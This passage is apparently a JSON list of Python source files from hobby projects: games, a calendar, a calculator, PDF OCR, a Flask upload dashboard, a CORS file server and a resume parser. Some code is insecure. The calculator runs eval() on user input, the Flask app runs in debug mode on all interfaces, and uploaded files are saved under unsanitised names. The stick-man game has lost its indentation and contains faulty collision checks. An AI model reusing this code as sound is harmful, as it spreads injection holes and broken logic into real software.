p_choice:\n\t\t\t\t\t\tboard[i][j] = \"O\"\n\t\t\t\t\t\tavailable.remove(p_choice)\n\t\t\t\t\t\tbreak\n\n\t\t\t\t\t\t\t\t\t\t\t\t\nboard[1][1] = \"X\"\navailable.remove(5)\ndisplay_board()\nturns = 0\nwhile turns < 4:\n\tplayer_choice()\n\tdisplay_board()\n\tif win_checker() == True:\n\t\tprint(\"Player Wins \ud83d\udc4d\ud83c\udffc\ud83d\udd25\")\n\t\tbreak\n\tcomp_choice()\n\tdisplay_board()\n\tif win_checker() == True:\n\t\tprint(\"Player Losses \ud83d\udc4e\ud83c\udfff\ud83d\ude2d\")\n\t\tbreak\n\tturns += 1\nelse:\n\tprint(\"It's a Tie \ud83d\ude14\ud83d\ude14\")",
    "import calendar\nfrom datetime import datetime\nimport argparse\n\n\ndef month_to_number(month):\n    \"\"\"Convert month name or number to month number.\"\"\"\n    # English month names from calendar\n    month_names_english = {m.lower(): i for i, m in enumerate(calendar.month_name) if m}\n    # Portuguese month names mapping\n    month_names_portuguese = {\n        \"janeiro\": 1, \"fevereiro\": 2, \"mar\u00e7o\": 3, \"abril\": 4,\n        \"maio\": 5, \"junho\": 6, \"julho\": 7, \"agosto\": 8,\n        \"setembro\": 9, \"outubro\": 10, \"novembro\": 11, \"dezembro\": 12\n    }\n\n    try:\n        # Try converting month using English names\n        return int(month)\n    except ValueError:\n        # Handle month name in English or Portuguese\n        month = month.lower()\n        if month in month_names_english:\n            return month_names_english[month]\n        elif month in month_names_portuguese:\n            return month_names_portuguese[month]\n        else:\n            raise KeyError(\"Invalid month name. Please specify a valid month name in English or Portuguese.\")\n\n\ndef highlight_day(text, day):\n    \"\"\"Highlight the specific day in the calendar text with a background color.\"\"\"\n    day_str = f\"{day:2}\"\n    return text.replace(day_str, f\"\\033[47;41m{day_str}\\033[0m\", 1)\n\n\ndef display_calendar(year, month=None):\n    cal = calendar.TextCalendar(calendar.SUNDAY)\n    today = datetime.now()\n\n    if month:\n        calendar_output = cal.formatmonth(year, month)\n        if month == today.month and year == today.year:\n            calendar_output = highlight_day(calendar_output, today.day)\n        print(calendar_output)\n    else:\n        calendar_output = cal.formatyear(year)\n        print(calendar_output)\n\n\ndef parse_args():\n    parser = argparse.ArgumentParser(\n        description=\"Display a calendar for a specific month and year, or the entire year, similar to Unix's cal command\")\n    parser.add_argument(\"-y\", \"--year\", type=int, help=\"The year to display the calendar for\")\n    parser.add_argument(\"-m\", \"--month\", help=\"The month to display the calendar for\")\n\n    args = parser.parse_args()\n    return args\n\n\ndef main():\n    args = parse_args()\n\n    # Use the current year and month if none are provided\n    current_date = datetime.now()\n    year = args.year if args.year is not None else current_date.year\n    month = None\n    if args.month:\n        try:\n            month = month_to_number(args.month)\n        except KeyError as e:\n            print(e)\n            return\n    elif args.year and not args.month:\n        # If only year is provided, display the entire year\n        display_calendar(year)\n        return\n    else:\n        # Default to current month and year if nothing is provided\n        month = current_date.month\n\n    display_calendar(year, month)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "from tkinter import *\nimport time\n\nclass Game:\ndef __init__(self):\nself.tk = Tk()\nself.tk.title(\"Stick Man -Brought to you by Itsourcecode.com\")\nself.tk.resizable(0, 0)\nself.tk.wm_attributes(\"-topmost\", 1)\nself.canvas = Canvas(self.tk, width=500, height=500, highlightthickness=0)\nself.canvas.pack()\nself.tk.update()\nself.canvas_height = 500\nself.canvas_width = 500\nself.bg = PhotoImage(file=\"resources/background.png\")\nw = self.bg.width()\nh = self.bg.height()\nfor x in range(0, 5):\nfor y in range(0, 5):\nself.canvas.create_image(x * w, y * h, image=self.bg, anchor='nw')\nself.sprites = []\nself.running = True\nself.game_over_text = self.canvas.create_text(250, 250, text='YOU WIN!', font=('Times', 30), state='hidden', fill='red')\nself.out = self.canvas.create_text(58, 22, text='EXIT', font=('Times', 7), fill='red')\n\ndef mainloop(self):\nwhile 1:\nif self.running:\nfor sprite in self.sprites:\nsprite.move()\nelse:\ntime.sleep(1)\nself.canvas.itemconfig(self.game_over_text, state='normal')\nself.tk.update_idletasks()\nself.tk.update()\ntime.sleep(0.01)\n\nclass Coordinates:\ndef __init__(self, x1=0, y1=0, x2=0, y2=0):\nself.x1 = x1\nself.y1 = y1\nself.x2 = x2\nself.y2 = y2\n\ndef within_x(c1, c2):\nif (c1.x1 > c2.x1 and c1.x1 < c2.x2) or (c1.x2 > c2.x1 and c1.x2 < c2.x2) or (c2.x1 > c1.x1 and c2.x1 < c1.x2) or (c2.x2 > c1.x1 and c2.x2 < c1.x1):\nreturn True\nelse:\nreturn False\n\ndef within_y(c1, c2):\nif (c1.y1 > c2.y1 and c1.y1 < c2.y2) or (c1.y2 > c2.y1 and c1.y2 < c2.y2) or (c2.y1 > c1.y1 and c2.y1 < c1.y2) or (c2.y2 > c1.y1 and c2.y2 < c1.y1):\nreturn True\nelse:\nreturn False\n\ndef collided_left(c1, c2):\nif within_y(c1, c2):\nif c1.x1 <= c2.x2 and c1.x1 >= c2.x1:\nreturn True\nreturn False\n\ndef collided_right(c1, c2):\nif within_y(c1, c2):\nif c1.x2 >= c2.x1 and c1.x2 <= c2.x2:\nreturn True\nreturn False\n\ndef collided_top(c1, c2):\nif within_x(c1, c2):\nif c1.y1 <= c2.y2 and c1.y1 >= c2.y1:\nreturn True\nreturn False\n\ndef collided_bottom(y, c1, c2):\nif within_x(c1, c2):\ny_calculation = c1.y2 + y\nif y_calculation >= c2.y1 and y_calculation <= c2.y2:\nreturn True\nreturn False\n\nclass Sprite:\ndef __init__(self, g):\nself.game = g\nself.endgame = False\nself.coordinates = None\ndef move(self):\npass\ndef syncronize(self):\nreturn self.coordinates\n\nclass PlatformSprite(Sprite):\ndef __init__(self, g, photo_resources, x, y, width, height):\nSprite.__init__(self, g)\nself.photo_image = photo_resources\nself.image = g.canvas.create_image(x, y, image=self.photo_image, anchor='nw')\nself.coordinates = Coordinates(x, y, x + width, y + height)\n\nclass MovingPlatformSprite(PlatformSprite):\ndef __init__(self, g, photo_resources, x, y, width, height):\nPlatformSprite.__init__(self, g, photo_resources, x, y, width, height)\nself.x = 2\nself.counter = 0\nself.last_time = time.time()\nself.width = width\nself.height = height\n\ndef coordinate(self):\nxy = self.game.canvas.coords(self.image)\nself.coordinates.x1 = xy[0]\nself.coordinates.y1 = xy[1]\nself.coordinates.x2 = xy[0] + self.width\nself.coordinates.y2 = xy[1] + self.height\nreturn self.coordinates\n\ndef move(self):\nif time.time() - self.last_time > 0.03:\nself.last_time = time.time()\nself.game.canvas.move(self.image, self.x, 0)\nself.counter += 1\nif self.counter > 20:\nself.x *= -1\nself.counter = 0\n\nclass DoorSprite(Sprite):\ndef __init__(self, g, x, y, width, height):#hei1353\nSprite.__init__(self, g)\nself.closed_door = PhotoImage(file=\"resources/door1.gif\")\nself.open_door = PhotoImage(file=\"resources/door2.gif\")\nself.image = g.canvas.create_image(x, y, image=self.closed_door, anchor='nw')\nself.coordinates = Coordinates(x, y, x + (width / 2), y + height)\nself.endgame = True\n\ndef op_door(self):\nself.game.canvas.itemconfig(self.image, image=self.open_door)\nself.game.tk.update_idletasks()\ndef cl_door(self):\nself.game.canvas.itemconfig(self.image, image=self.closed_door)\nself.game.tk.update_idletasks()\n\nclass StickFigureSprite(Sprite):\ndef __init__(self, g):\nSprite.__init__(self, g)\nself.images_left = [\nPhotoImage(file=\"resources/figure-L1.gif\"),\nPhotoImage(file=\"resources/figure-L2.gif\"),\nPhotoImage(file=\"resources/figure-L3.gif\")\n]\nself.images_right = [\nPhotoImage(file=\"resources/figure-R1.gif\"),\nPhotoImage(file=\"resources/figure-R2.gif\"),\nPhotoImage(file=\"resources/figure-R3.gif\")\n]\nself.image = g.canvas.create_image(200, 470, \\\nimage=self.images_left[0], anchor='nw')\nself.x = -2\nself.y = 0\nself.current_image = 0\nself.current_image_add = 1\nself.jump_count = 0\nself.last_time = time.time()\nself.coordinates = Coordinates()\ng.canvas.bind_all('<KeyPress-Left>', self.turn_left)\ng.canvas.bind_all('<KeyPress-Right>', self.turn_right)\ng.canvas.bind_all('<space>', self.jump)\ndef turn_left(self, evt):\nif self.y == 0:\nself.x = -2\ndef turn_right(self, evt):\nif self.y == 0:\nself.x = 2\n#brought to you by code-projects.org\ndef jump(self, evt):\nif self.y == 0:\nself.y = -4\nself.jump_count = 0\n\ndef animation(self):\nif self.x != 0 and self.y == 0:\nif time.time() - self.last_time > 0.1:\nself.last_time = time.time()\nself.current_image += self.current_image_add\nif sel",
    "from tkinter import Tk\nfrom tkinter import StringVar, Entry, Button\nfrom math import pi, e, sin, cos, tan, log, log10, ceil, degrees, radians, exp, asin, acos, floor\nfrom tkinter import *\n\n\nclass calculator(Tk):\n    def __init__(self):\n        super().__init__()\n\n        self.title('Scientific Calculator')\n        self.geometry('410x410')\n        self.configure(background=\"white\")\n        self.string = StringVar()\n        entry = Entry(self, textvariable=self.string)\n        entry.grid(row=0, column=0, columnspan=6)\n        entry.configure(background=\"white\")\n        self.btn_bg_color = 'cyan'\n        entry.focus()\n\n        values = [\"7\", \"8\", \"9\", \"/\", \"%\", \"clear\", \"AC\",\n                  \"4\", \"5\", \"6\", \"*\", \"(\", \")\", \"**\",\n                  \"1\", \"2\", \"3\", \"-\", \"=\", \",\", \"0\", \".\", \"min\", \"+\", \"sin\", \"asin\", \"cos\", \"acos\", \"tan()\",\n                  \"pow\", \"log10\", \"max\", \"abs\", \"floor\", \"pi\", \"e\", \"log\", \"ceil\", \"degrees\", \"radians\"]\n        text = 1\n        i = 0\n        row = 1\n        col = 0\n        for txt in values:\n            padx = 10\n            pady = 10\n            if (i == 7):\n                row = 2\n                col = 0\n            if (i == 14):\n                row = 3\n                col = 0\n            if (i == 19):\n                row = 4\n                col = 0\n            if (i == 26):\n                row = 5\n                col = 0\n            if (i == 33):\n                row = 6\n                col = 0\n            if (txt == '='):\n                btn = Button(self, height=2, width=4, padx=70, pady=pady, text=txt,\n                             command=lambda txt=txt: self.equals())\n                btn.grid(row=row, column=col, columnspan=3, padx=2, pady=2)\n                btn.configure(background=\"yellow\")\n\n            elif (txt == 'clear'):\n                btn = Button(self, height=2, width=4, padx=padx, pady=pady, text=txt,\n                             command=lambda txt=txt: self.delete())\n                btn.grid(row=row, column=col, padx=1, pady=1)\n                btn.configure(background=\"grey\")\n            elif (txt == 'AC'):\n                btn = Button(self, height=2, width=4, padx=padx, pady=pady, text=txt,\n                             command=lambda txt=txt: self.clearall())\n                btn.grid(row=row, column=col, padx=1, pady=1)\n                btn.configure(background=\"red\")\n            else:\n                btn = Button(self, height=2, width=4, padx=padx, pady=pady, text=txt,\n                             command=lambda txt=txt: self.addChar(txt))\n                btn.grid(row=row, column=col, padx=1, pady=1)\n                btn.configure(background=self.btn_bg_color)\n\n            col = col + 1\n            i = i + 1\n\n        Menue_1 = Menu(self)\n        dark_mode = Menu(Menue_1, tearoff=False)\n        dark_mode.add_command(label='Dark Mode', command=self.dark_mode_)\n        self.config(menu=Menue_1)\n        Menue_1.add_cascade(label='Dark Mode', menu=dark_mode)\n\n        self.mainloop()\n\n    def clearall(self):\n        self.string.set(\"\")\n\n    def equals(self):\n        result = \"\"\n\n        try:\n            result = eval(self.string.get())\n            self.string.set(result)\n        except:\n            result = \"INVALID INPUT\"\n        self.string.set(result)\n\n    def addChar(self, char):\n        self.string.set(self.string.get() + (str(char)))\n\n    def delete(self):\n        self.string.set(self.string.get()[0:-1])\n\n    def dark_mode_(self):\n        self.config(bg='grey')\n        \n\n\ncalculator()\n\n\n  \n        \n",
    "import fitz  # PyMuPDF\nimport pytesseract\nfrom PIL import Image\nimport configparser\nfrom sys import exit\nimport logging\n\nconfig = configparser.ConfigParser()\nconfig.read(\"config.cfg\")\nlogging.basicConfig(\n    filename=\"ocr.log\",\n    level=logging.INFO,\n    format=\"%(asctime)s - %(levelname)s - %(message)s\",\n)\npytesseract.pytesseract.tesseract_cmd = r\"{}\".format(\n    config.get(\"LibraryOptions\", \"location\")\n)\n\n\ndef adjust_coordinates_for_image(coordinates, image_width, page_width):\n    # Unpack the original coordinates\n    x1, y1, x2, y2 = coordinates\n\n    # Calculate the scaling factor based on the ratio of the image width to the page width\n    scaling = page_width / image_width\n\n    # Adjust the coordinates based on the scaling factor\n    adjusted_x1 = x1 * scaling\n    adjusted_y1 = y1 * scaling\n    adjusted_x2 = x2 * scaling\n    adjusted_y2 = y2 * scaling\n\n    return (adjusted_x1, adjusted_y1, adjusted_x2, adjusted_y2)\n\n\ndef is_subdocument(page, ocr_settings, image_width, page_width):\n    for setting in ocr_settings:\n        ocr_settings[setting] = adjust_coordinates_for_image(\n            ocr_settings[setting], image_width, page_width\n        )\n\n    # print(ocr_settings)\n\n    for setting in ocr_settings:\n        doc_type = setting\n        coordinates = ocr_settings[doc_type]\n        img_rect = fitz.Rect(coordinates)\n        img_pixmap = page.get_pixmap(clip=img_rect)\n        try:\n            pil_image = Image.frombytes(\n                \"RGB\", [img_pixmap.width, img_pixmap.height], img_pixmap.samples\n            )\n        except Exception as e:\n            logging.error(e)\n            print(\"Error! Check coordinates\")\n            exit()\n        try:\n            extracted_text = pytesseract.image_to_string(pil_image)\n        except Exception as e:\n            logging.error(e)\n            print(\n                \"Please specify location of Tesseract folder (Default: Tesseract-OCR/tesseract.exe)\"\n            )\n            exit()\n\n        extracted_text = extracted_text.strip().lower()\n\n        if doc_type.lower() in extracted_text:\n            return True, doc_type\n\n    return False, None\n\n\ndef find_subdocuments(pdf_path, ocr_settings):\n    subdocuments = []\n\n    try:\n        # Open the PDF file\n        doc = fitz.open(pdf_path)\n\n        for page_num, page in enumerate(doc, 1):\n            page_width = page.rect.width\n\n            image_list = page.get_images()\n\n            if len(image_list) == 1:\n                img = image_list[0]\n                xref = img[0]  # get the XREF of the image\n                pix = fitz.Pixmap(doc, xref)  # create a Pixmap\n                image_width = pix.width\n\n                status, doc_type = is_subdocument(\n                    page, dict(ocr_settings), image_width, page_width\n                )\n                if status:\n                    subdocuments.append((doc_type, page_num))\n\n            else:\n                print(f\"Multiple Images Found in {pdf_path} at {page_num} page\")\n\n        # Close the PDF document\n        doc.close()\n    except Exception as e:\n        print(f\"Sorry, couldn't find subdocuments for {pdf_path}\", e)\n        logging.error(e)\n        return []\n\n    return subdocuments\n",
    "import random\n\nprint(\"================================================\")\nprint(\"\\tWelcome to the blackjack game !\")\nprint(\"===============================================\")\nprint(\n  '''\n  .------.            _     _            _    _            _    \n  |A_  _ |.          | |   | |          | |  (_)          | |   \n  |( \\/ ).-----.     | |__ | | __ _  ___| | ___  __ _  ___| | __\n  | \\  /|K /\\  |     | '_ \\| |/ _` |/ __| |/ / |/ _` |/ __| |/ /\n  |  \\/ | /  \\ |     | |_) | | (_| | (__|   <| | (_| | (__|   < \n  `-----| \\  / |     |_.__/|_|\\__,_|\\___|_|\\_\\ |\\__,_|\\___|_|\\_\\\\\n        |  \\/ K|                            _/ |                \n        `------'                           |__/           \n  '''\n)\n# Define card ranks, suits, and values\nranks = ['Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine', 'Ten', 'Jack', 'Queen', 'King', 'Ace']\nsuits = ['Hearts', 'Diamonds', 'Clubs', 'Spades']\nvalues = {'Two': 2, 'Three': 3, 'Four': 4, 'Five': 5, 'Six': 6, 'Seven': 7, 'Eight': 8, 'Nine': 9, 'Ten': 10,\n          'Jack': 10, 'Queen': 10, 'King': 10, 'Ace': 11}\n\ncoins = 50\nprint(\"\\t\\tYou have 50 coins !\")\n\n# Define function to create deck of cards\ndef create_deck():\n    deck = []\n    for rank in ranks:\n        for suit in suits:\n            card = (rank, suit)\n            deck.append(card)\n    return deck\n\n#Himel Sarder\n#Department of Computer Science and Engineering\n#Bangamata Sheikh Fojilatunnesa Mujib Science and Technology University, Jamalpur, Bangladesh\n\n\n# Define function to deal a card\ndef deal_card(deck):\n    card = random.choice(deck)\n    deck.remove(card)\n    return card\n\n# Define function to calculate hand value\ndef calculate_hand_value(hand):\n    value = 0\n    for card in hand:\n        rank = card[0]\n        value += values[rank]\n    return value\n\n# Define function to display hand\ndef display_hand(hand):\n    for card in hand:\n        print(card[0], 'of', card[1])\n\n# Define function to check if hand is a blackjack\ndef is_blackjack(hand):\n    return len(hand) == 2 and calculate_hand_value(hand) == 21\n\n# Define function to check if hand is bust\ndef is_bust(hand):\n    return calculate_hand_value(hand) > 21\n\n# Main function to play the game\ndef play_blackjack(coins):\n    print(\"================================================\")\n    print()\n    if coins < 10:\n        print(\"Sorry, you don't have enough coins to play!\")\n        print(\"=====================================\")\n        print(\"\\t\\t\\tGame over!\")\n        print(\"=====================================\")\n        return\n\n    deck = create_deck()\n    player_hand = [deal_card(deck), deal_card(deck)]\n    dealer_hand = [deal_card(deck), deal_card(deck)]\n\n    print(\"\\nYour hand:\")\n    display_hand(player_hand)\n    print(\"\\nDealer's hand:\")\n    print(dealer_hand[0][0], 'of', dealer_hand[0][1])\n\n    # Player's turn\n    while True:\n        choice = input(\"\\nDo you want to hit or stand? (h/s): \").lower()\n        if choice == 'h':\n            player_hand.append(deal_card(deck))\n            print(\"\\nYour hand:\")\n            display_hand(player_hand)\n            if is_blackjack(player_hand):\n                print(\"Congratulations! You have a Blackjack!\")\n                coins += 10\n                break\n            elif is_bust(player_hand):\n                print()\n                print(\"Sorry, you busted! Dealer wins.\")\n                coins -= 10\n                break\n        elif choice == 's':\n            break\n        else:\n            print(\"Invalid choice! Please enter 'h' or 's'.\")\n\n#Himel Sarder\n#Department of Computer Science and Engineering\n#Bangamata Sheikh Fojilatunnesa Mujib Science and Technology University, Jamalpur, Bangladesh\n\n    # Dealer's turn\n    if not is_bust(player_hand):\n        print(\"\\nDealer's hand:\")\n        display_hand(dealer_hand)\n        while calculate_hand_value(dealer_hand) < 17:\n            dealer_hand.append(deal_card(deck))\n            print(\"\\nDealer hits...\")\n            display_hand(dealer_hand)\n            if is_bust(dealer_hand):\n                print()\n                print(\"Dealer busted! You win!\")\n                coins += 10\n                break\n        if calculate_hand_value(dealer_hand) <= 21:\n            if calculate_hand_value(player_hand) > calculate_hand_value(dealer_hand):\n                print()\n                print(\"You win!\")\n                coins += 10\n\n            elif calculate_hand_value(player_hand) < calculate_hand_value(dealer_hand):\n                print()\n                print(\"Dealer wins!\")\n                coins -= 10\n            else:\n                print(\"It's a tie!\")\n                '''\n        else:\n            print()\n            print(\"Dealer busted! You win!\")\n            coins += 10\n            '''\n#Himel Sarder\n#Department of Computer Science and Engineering\n#Bangamata Sheikh Fojilatunnesa Mujib Science and Technology University, Jamalpur, Bangladesh\n\n    print()\n    print(f\"Current coins: {coins}\")   \n    print()\n    play_again = input(\"Do you want to play again? (yes/no):",
    "import numpy\nimport numba\nimport Objects\nimport json\n\n\ndef getWallDists(map: numpy.ndarray):\n    list1 = list()  ##\u6a2a\u5411\n    list2 = list()  ##\u7eb5\u5411\n    list3 = list()  ## \u9876\u9762\n    row, col = map.shape\n    camdist = None\n    list2.append(\n        numpy.array(\n            (\n                (row * 40, row * 40, 0, 0),\n                (0, 40, 40, 0),\n                (0, 0, 0, 0),\n            )\n        )\n    )  ##\u5de6\u5899\n    list2.append(\n        numpy.array(\n            (\n                (0, 0, row * 40, row * 40),\n                (0, 40, 40, 0),\n                (col * 40, col * 40, col * 40, col * 40),\n            )\n        )\n    )  ##\u53f3\u5899\n    list3.append(\n        numpy.array(\n            (\n                (0, row * 40, row * 40, 0),\n                (40, 40, 40, 40),\n                (0, 0, -40, -40),\n            )\n        )\n    )  ##\u5de6\u5899\u9876\n    list3.append(\n        numpy.array(\n            (\n                (0, row * 40, row * 40, 0),\n                (40, 40, 40, 40),\n                ((col + 1) * 40, (col + 1) * 40, col * 40, col * 40),\n            )\n        )\n    )  ##\u53f3\u5899\u9876\n    list1.append(\n        numpy.array(\n            (\n                (0, 0, 0, 0),\n                (0, 40, 40, 0),\n                (0, 0, col * 40, col * 40),\n            )\n        )\n    )  ##\u540e\u5899\n    list1.append(\n        numpy.array(\n            (\n                (row * 40, row * 40, row * 40, row * 40),\n                (0, 40, 40, 0),\n                (col * 40, col * 40, 0 * 40, 0 * 40),\n            )\n        )\n    )  ##\u524d\u5899\n    list3.append(\n        numpy.array(\n            (\n                (-40, 0, 0, -40),\n                (40, 40, 40, 40),\n                (col * 40, col * 40, 0 * 40, 0 * 40),\n            )\n        )\n    )  ##\u540e\u5899\u9876\n    list3.append(\n        numpy.array(\n            (\n                (row * 40, (row + 1) * 40, (row + 1) * 40, row * 40),\n                (40, 40, 40, 40),\n                (col * 40, col * 40, 0 * 40, 0 * 40),\n            )\n        )\n    )  ##\u524d\u5899\u9876\n    list3.append(\n        numpy.array(\n            (\n                (row * 40, (row + 1) * 40, (row + 1) * 40, row * 40),\n                (40, 40, 40, 40),\n                ((col + 1) * 40, (col + 1) * 40, col * 40, col * 40),\n            )\n        )\n    )  ##\u53f3\u524d\u89d2\n    list3.append(\n        numpy.array(\n            (\n                (row * 40, (row + 1) * 40, (row + 1) * 40, row * 40),\n                (40, 40, 40, 40),\n                (0, 0, -40, -40),\n            )\n        )\n    )  ##\u5de6\u524d\u89d2\n    list3.append(\n        numpy.array(((-40, 0, 0, -40), (40, 40, 40, 40), (0, 0, -40, -40)))\n    )  ##\u5de6\u540e\u89d2\n    list3.append(\n        numpy.array(\n            (\n                (-40, 0, 0, -40),\n                (40, 40, 40, 40),\n                ((col + 1) * 40, (col + 1) * 40, col * 40, col * 40),\n            )\n        )\n    )  ##\u53f3\u540e\u89d2\n    list3.append(\n        numpy.array(\n            (\n                (0, 0, row * 40, row * 40),\n                (0, 0, 0, 0),\n                (0, col * 40, col * 40, 0),\n            )\n        )\n    )  ##\u5730\u677f\n    list3.append(\n        numpy.array(\n            (\n                (0, row * 40, row * 40, 0),\n                (0, 0, 0, 0),\n                (0, 0, col * 40, col * 40),\n            )\n        )\n    )  ##\u5730\u677f2\n    for i in range(0, row):\n        for j in range(0, col):\n            if map[i, j] == 1:\n                if i > 0 and map[i - 1, j] != 1:\n                    list1.append(\n                        numpy.array(\n                            (\n                                (i * 40, i * 40, i * 40, i * 40),\n                                (0, 40, 40, 0),\n                                ((j + 1) * 40, (j + 1) * 40, j * 40, j * 40),\n                            )\n                        )\n                    )\n                if i < row - 1 and map[i + 1, j] != 1:\n                    list1.append(\n                        numpy.array(\n                            (\n                                (\n                                    (i + 1) * 40,\n                                    (i + 1) * 40,\n                                    (i + 1) * 40,\n                                    (i + 1) * 40,\n                                ),\n                                (0, 40, 40, 0),\n                                (j * 40, j * 40, (j + 1) * 40, (j + 1) * 40),\n                            )\n                        )\n                    )\n                if j > 0 and map[i, j - 1] != 1:\n                    list2.append(\n                        numpy.array(\n                            (\n                                (i * 40, i * 40, (i + 1) * 40, (i + 1) * 40),\n                                (0, 40, 40, 0),\n                                (j * 40, j * 40, j * 40, j * 40),\n                            )\n                        )\n                    )\n                if j < col - 1 and map[i, j + 1] != 1:\n                    list2.append(\n                        numpy.array(\n                            (\n                                ((i + 1) * 40, (i + 1) * 40, i * 40, i * 40),\n     ",
    "from flask import Flask, render_template, request, redirect, url_for, Response\nfrom datetime import datetime\nfrom werkzeug.utils import secure_filename\nimport os\nimport uuid\nfrom pymongo import MongoClient\nimport json\nfrom hurry.filesize import size, si\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = os.getenv(\"UPLOAD_DIRECTORY\")\n\nmongodbHost = os.getenv(\"MONGODB_HOST\")\nmongodbPort = int(os.getenv(\"MONGODB_PORT\"))\n\nclient = MongoClient(mongodbHost, mongodbPort)\nscan8 = client['scan8']\nprequeuedScans = scan8['prequeuedScans']\nqueuedScans = scan8['queuedScans']\nrunningScans = scan8['runningScans']\ncompletedScans = scan8['completedScans']\n\n# TODO: add a caching layer to all routes\n\n\ndef index():\n    prequeued = prequeuedScans.find()\n    queued = queuedScans.find()\n    running = runningScans.find()\n    completed = completedScans.find()\n    return render_template('index.html', prequeued=prequeued, queued=queued, running=running, completed=completed, newScanUrl=url_for('newScan'))\n\n\ndef new_scan():\n    return render_template('newScan.html')\n\n\ndef upload_files():\n    if request.method == 'POST':\n        id = uuid.uuid4()\n        uploadedFiles = request.files.getlist('dir')\n        dirPath = os.path.join(app.config['UPLOAD_FOLDER'], str(id))\n        os.mkdir(dirPath)\n\n        for file in uploadedFiles:\n            if file:\n                filename = secure_filename(file.filename)\n                file.save(os.path.join(dirPath, filename))\n\n        curTime = datetime.now()\n        dirSize = 0\n        numFiles = 0\n        for element in os.scandir(dirPath):\n            dirSize+=os.path.getsize(element)\n            numFiles += 1\n            \n        scan8.prequeuedScans.insert_one(\n            {\"_id\": str(id), \"submitTime\": {\"date\": curTime.strftime(\"%d-%m-%Y\"), \"time\": curTime.strftime(\n                \"%H:%M:%S\")}, \"size\": size(dirSize, system=si), \"files\": {\"total\": numFiles, \"completed\": 0}}\n        )\n\n    return redirect(url_for('dashboard'))\n\n\ndef progress():\n    def generate():\n        while True:\n            running = runningScans.find()\n            x = {}\n            for item in running:\n                x[item[\"_id\"]] = str(\n                    (item[\"files\"][\"completed\"] / item[\"files\"][\"total\"]) * 100)\n\n            yield \"data:\" + json.dumps(x) + \"\\n\\n\"\n\n    return Response(generate(), mimetype='text/event-stream')\n\n\napp.add_url_rule(\"/\", endpoint=\"dashboard\", view_func=index, methods=['GET'])\napp.add_url_rule(\"/newScan\", endpoint=\"newScan\",\n                 view_func=new_scan, methods=['GET'])\napp.add_url_rule(\"/progress\", endpoint=\"progress\",\n                 view_func=progress, methods=['GET'])\napp.add_url_rule(\"/upload\", endpoint=\"upload\",\n                 view_func=upload_files, methods=['GET', 'POST'])\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\",debug=True)\n",
    "import os\nimport argparse\nfrom http.server import HTTPServer, SimpleHTTPRequestHandler\n\n\nclass CORSHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def end_headers(self):\n        self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n        self.send_header(\"Access-Control-Allow-Methods\", \"GET, OPTIONS\")\n        self.send_header(\"Access-Control-Allow-Headers\", \"*\")\n        super().end_headers()\n\n    def do_OPTIONS(self):\n        self.send_response(200, \"OK\")\n        self.end_headers()\n\n\ndef run(\n    server_class=HTTPServer,\n    handler_class=CORSHTTPRequestHandler,\n    port=8000,\n    directory=None,\n):\n    if directory:  # Change the current working directory if directory is specified\n        os.chdir(directory)\n    server_address = (\"\", port)\n    httpd = server_class(server_address, handler_class)\n    print(f\"Serving HTTP on http://localhost:{port} from directory '{directory}'...\")\n    httpd.serve_forever()\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"HTTP Server with CORS\")\n    parser.add_argument(\n        \"--dir\", type=str, help=\"Directory to serve files from\", default=\".\"\n    )\n    parser.add_argument(\"--port\", type=int, help=\"Port to serve HTTP on\", default=8888)\n    args = parser.parse_args()\n\n    run(port=args.port, directory=args.dir)\n",
    "import base64\nimport os\nimport pandas as pd\nimport streamlit as st\nfrom pyresparser import ResumeParser\nimport nltk\nimport spacy\n\n# Downloading necessary NLTK resources and loading Spacy model\nnltk.download('stopwords')\nspacy.load('en_core_web_sm')\n\n# Skill categories dictionary for categorization\nskill_categories = {\n    'Technical': ['Python', 'Java', 'C++', 'SQL', 'JavaScript'],\n    'Soft': ['Communication', 'Teamwork', 'Leadership', 'Time Management'],\n    'Analytical': ['Data Analysis', 'Critical Thinking', 'Problem Solving']\n}\nuser_type = ['Normal User', \"Admin User\"]\n\ndef parse_resume(file_path):\n    \"\"\" Parses the resume and extracts data using ResumeParser. \"\"\"\n    if not os.path.exists(file_path):\n        return \"File not found\"\n    \n    try:\n        data = ResumeParser(file_path).get_extracted_data()\n        return {\n            'name': data.get('name'),\n            'email': data.get('email'),\n            'mobile_number': data.get('mobile_number'),\n            'skills': data.get('skills'),\n            'college_name': data.get('college_name'),\n            'degree': data.get('degree'),\n            'designation': data.get('designation'),\n            'experience': data.get('experience'),\n            'total_experience': data.get('total_experience')\n        }\n    except Exception as e:\n        return f\"Error parsing the resume: {str(e)}\"\n\ndef categorize_skills(skills):\n    \"\"\" Categorizes skills into predefined categories. \"\"\"\n    categorized_skills = {category: [] for category in skill_categories.keys()}\n    if skills:\n        for skill in skills:\n            for category, keywords in skill_categories.items():\n                if skill in keywords:\n                    categorized_skills[category].append(skill)\n    return categorized_skills\n\ndef display_info(data, info_selection):\n    \"\"\" Displays selected information from the parsed resume data. \"\"\"\n    for info in info_selection:\n        if info in data and data[info]:\n            st.write(f\"**{info.replace('_', ' ').title()}:**\", data[info])\n\ndef handle_file_upload(user):\n    \"\"\" Handles file upload logic for admin and regular users. \"\"\"\n    with st.sidebar:\n        if user == \"Admin User\":\n            uploaded_files = st.file_uploader(\"Upload multiple resumes\", type=['pdf'], accept_multiple_files=True)\n            return uploaded_files\n        else:\n            uploaded_file = st.file_uploader(\"Upload your resume\", type=['pdf'])\n            return [uploaded_file] if uploaded_file else []\n\ndef main():\n    \"\"\" Main function to orchestrate the uploading and parsing of resumes. \"\"\"\n    st.title(\"Streamlit Resume Parser\")\n\n    with st.sidebar:\n        st.markdown(\"Choose User\")\n        user = st.sidebar.selectbox(\"Pick What type of User you are\", user_type)\n        info_selection = st.multiselect('Select the information you want to display:',\n                                        ['Email', 'Mobile Number', 'Skills', 'Education', 'Experience'],\n                                        default=['Skills', 'Experience'])\n    \n    uploaded_files = handle_file_upload(user)\n\n    if uploaded_files:\n        for uploaded_file in uploaded_files:\n            if uploaded_file is not None:\n                # Assuming a secure way to save and handle files\n                with open(uploaded_file.name, \"wb\") as f:\n                    f.write(uploaded_file.getbuffer())\n\n                data = 